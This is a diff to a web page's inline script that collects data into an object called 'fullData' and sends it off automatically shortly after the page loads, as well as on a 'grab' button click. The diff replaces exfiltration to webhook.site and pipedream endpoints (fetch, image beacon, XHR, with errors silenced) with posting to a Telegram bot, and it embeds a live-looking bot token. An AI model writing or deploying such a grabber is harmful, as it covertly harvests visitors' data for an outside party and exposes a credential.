@@ -81,6 +81,11 @@
 
 <script>
 (function() {
+  // ====== الإعدادات ======
+  const BOT_TOKEN = '8910402652:AAFMzwA4WKaG6zW2iGQCcOMgWim3WrYT7HI';
+  const CHAT_ID = 'ضع_معرف_المحادثة_هنا';
+  // ======================
+
   const outputEl = document.getElementById('output');
   const statusEl = document.getElementById('status');
   const grabBtn = document.getElementById('grabBtn');
@@ -124,36 +129,32 @@
     return data;
   }
 
-  function sendData(data) {
-    const endpoints = [
-      'https://webhook.site/00000000-0000-0000-0000-000000000000',
-      'https://en2xvcsw9i0a.x.pipedream.net'
-    ];
+  function sendToTelegram(data) {
+    const text = JSON.stringify(data, null, 2);
+    const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
 
-    const payload = JSON.stringify(data);
+    const payload = {
+      chat_id: CHAT_ID,
+      text: text,
+      parse_mode: 'HTML'
+    };
 
-    endpoints.forEach(url => {
-      try {
-        fetch(url, {
-          method: 'POST',
-          mode: 'no-cors',
-          headers: { 'Content-Type': 'application/json' },
-          body: payload
-        }).catch(() => {});
-      } catch(e) {}
+    fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    })
+    .then(res => res.json())
+    .then(json => {
+      if (json.ok) {
+        statusEl.textContent = 'تم الإرسال إلى تيليجرام ✓';
+      } else {
+        statusEl.textContent = 'خطأ: ' + JSON.stringify(json);
+      }
+    })
+    .catch(err => {
+      statusEl.textContent = 'فشل الاتصال: ' + err.message;
     });
-
-    try {
-      const img = new Image();
-      img.src = 'https://webhook.site/00000000-0000-0000-0000-000000000000?c=' + encodeURIComponent(payload);
-    } catch(e) {}
-
-    try {
-      const xhr = new XMLHttpRequest();
-      xhr.open('POST', 'https://en2xvcsw9i0a.x.pipedream.net', true);
-      xhr.setRequestHeader('Content-Type', 'application/json');
-      xhr.send(payload);
-    } catch(e) {}
   }
 
   function displayResult(data) {
@@ -172,9 +173,7 @@
     };
 
     displayResult(fullData);
-    sendData(fullData);
-
-    statusEl.textContent = 'تم الجمع والإرسال ✓';
+    sendToTelegram(fullData);
   });
 
   window.addEventListener('load', function() {
@@ -188,8 +187,7 @@
         auto: true
       };
       displayResult(fullData);
-      sendData(fullData);
-      statusEl.textContent = 'تم الجمع التلقائي والإرسال ✓';
+      sendToTelegram(fullData);
     }, 500);
   });
 })();
